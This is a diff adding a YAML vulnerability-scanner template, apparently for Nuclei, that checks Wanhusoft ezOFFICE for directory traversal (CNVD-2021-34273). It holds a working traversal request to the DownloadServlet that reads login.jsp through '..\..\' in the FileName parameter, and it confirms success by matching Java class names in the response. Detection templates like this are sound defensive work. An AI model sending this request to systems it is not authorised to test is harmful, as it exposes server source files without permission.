@@ -1,0 +1,24 @@
+id: yaml-poc-wanhusoft-ezoffice-directory_traversal-CNVD-2021-34273
+info:
+  name: Yaml Poc Wanhusoft Ezoffice Directory_Traversal Cnvd 2021 34273
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-wanhusoft-ezoffice-directory_traversal-CNVD-2021-34273'
+  tags: traversal
+  reference:
+  - http://124.223.89.192/archives/ezoffice01
+http:
+- method: GET
+  path:
+  - /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..\..\login.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - com.whir.component.util
+    - com.whir.component.config.ConfigReader.getFileServer
